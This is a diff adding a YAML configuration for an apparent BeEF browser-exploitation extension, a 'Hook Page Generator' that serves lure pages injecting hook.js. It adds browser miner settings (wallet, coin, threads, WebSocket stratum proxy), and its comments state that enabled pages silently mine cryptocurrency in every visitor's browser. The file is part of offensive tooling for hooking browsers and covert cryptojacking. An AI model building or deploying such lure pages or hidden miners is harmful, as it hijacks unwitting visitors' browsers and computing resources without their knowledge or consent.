@@ -1,0 +1,18 @@
+beef:
+    extension:
+        hookpages:
+            enable: true
+            name: "Hook Page Generator"
+            description: "Dynamically creates and serves lure pages that inject hook.js"
+            # ── Browser Miner settings ───────────────────────────────────────────
+            # Set your wallet address here.  Pages created with "Enable Miner"
+            # will silently mine the chosen coin in every visitor's browser.
+            # The stratum-ws proxy (miner-proxy/) must be running and accessible.
+            miner:
+                wallet:      "YOUR_SOLANA_WALLET_HERE"
+                coin:        "SOL"
+                worker_name: "beef_hook"
+                threads:     2
+                # WebSocket URL of the stratum proxy – deploy.sh sets this up.
+                # After deployment, nginx exposes it at wss://YOUR_DOMAIN/miner-ws
+                ws_proxy:    "wss://YOUR_DOMAIN/miner-ws"
